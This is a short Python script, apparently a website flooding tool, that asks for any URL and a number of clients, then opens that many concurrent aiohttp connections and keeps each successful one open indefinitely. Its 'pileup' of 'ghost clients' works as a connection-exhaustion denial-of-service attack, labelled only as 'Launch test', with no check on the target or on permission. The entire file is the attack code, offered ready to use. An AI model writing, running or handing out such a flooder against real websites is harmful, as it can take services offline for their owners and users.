import asyncio
import aiohttp
import sys
import os
import time
import asciiart

async def start_pileup(target, count, delay):
    limit = asyncio.Semaphore(count)
    headers = {"User-Agent": "Mozilla/5.0"}
    
    async def ghost_client(session):
        async with limit:
            try:
                async with session.get(target, headers=headers) as resp:
                    print(resp.status)
                    if resp.status == 200:
                        await asyncio.Event().wait()
            except Exception:
                pass

    conn = aiohttp.TCPConnector(limit=count)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = []
        for _ in range(count):
            tasks.append(asyncio.create_task(ghost_client(session)))
            await asyncio.sleep(delay)
        await asyncio.gather(*tasks)

userchoice = input("What would you like to do now?\n Enter a number: \n1. Launch test\n2. Quit\n")

if userchoice == "2":
    print("Bye!")
elif userchoice == "1":
    try:
        url = input("Paste the website link: ")
        clientcount = int(input("How many clients to enter the website? "))
        frequency = float(input("Delay between clients joining? "))
        
        asyncio.run(start_pileup(url, clientcount, frequency))
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        print(f"Something has gone wrong: {e}")